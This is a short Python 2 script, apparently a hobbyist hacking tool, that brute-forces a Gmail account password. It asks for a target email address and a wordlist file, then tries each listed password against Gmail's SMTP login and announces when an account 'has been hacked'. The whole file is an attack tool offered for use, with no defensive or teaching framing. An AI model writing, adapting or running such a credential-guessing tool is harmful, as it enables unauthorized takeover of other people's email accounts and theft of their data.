#!/usr/bin/python

import smtplib
from os import system

W = '\033[1;34;40m'
Br = '\033[1;32;40m'
Bg = '\033[1;31;40m'
Y = '\033[1;32;40m'
Bb = '\033[1;32;40m'
Bm = '\033[1;32;40m'
Bc = '\033[1;32;40m'
M = '\033[1;34m'
C = '\033[1;31m'

def main():
   print(M)
'================================================='
main()
print(Bc)
'[1] start'
print
print (" Please Enter 1 To Start")
option = input('==>')
print ("\n")
if option == 1:
   file_path = raw_input('Please Enter Your WordList :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('enter the target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this password==> :' + password + '     '

            break
         else:
            print '[!] password not found => ' + password
login()
